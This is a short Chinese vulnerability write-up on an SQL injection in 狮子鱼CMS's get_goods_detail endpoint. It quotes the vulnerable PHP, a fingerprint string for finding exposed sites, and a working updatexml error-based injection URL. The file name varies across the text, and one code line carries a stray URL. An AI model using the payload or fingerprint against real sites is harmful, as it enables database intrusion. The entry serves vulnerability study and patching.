---
title: "狮子鱼CMS ApigoodController.class.php SQL注入漏洞"
date: 2026-10-12 09:01:31
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "狮子鱼CMS"
tags:
  - "狮子鱼CMS"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞

## 漏洞影响

```
狮子鱼CMS
```

## 网络测绘

```
"/seller.php?s=/Public/login"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170929313.png)

存在漏洞的文件为 **ApigoodsController.class.php** , 关键位置为

```php
 public function get_goods_detail() {
        $id = I('get.id');
        $pin_id = I('get.pin_id', 0);
		
		$token = I('get.token');
		
		$weprogram_token = M('weprogram_token')->field('member_id')->where( array('token' =>$token) )->find();
		$member_id = $weprogram_token['member_id'];
		
		
		 
		
        $need_data = array();
        $sql = "select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video,
            gd.summary,gd.share_title,gd.activity_summary,gd.tag from " . C('DB_PREFIX') . "goods g," . C('DB_PREFIX') . "goods_description gd where g.goods_id=gd.goods_id and g.goods_id=" . $id;
        $goods = M()->query($sql);
        $pin_model = D('Home/Pin');
        $goods_model = D('Home/Goods');
        $qian = array(
            "/Uploads/image"
        );
		$c_site_url = str_replace('/dan','',C('SITE_URL'));
        $hou = array(
            $c_site_url . "/Uploads/image"
        );
		$goods[0]['video_src'] = C('SITE_URL')."Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/".$goods[0]['video_src'];
		
        $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']);
        $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']);
        $qian = array(
            "\r\n"
        );
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170929712.png)

漏洞测试为

```plain
https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170929602.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS-ApigoodController.class.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
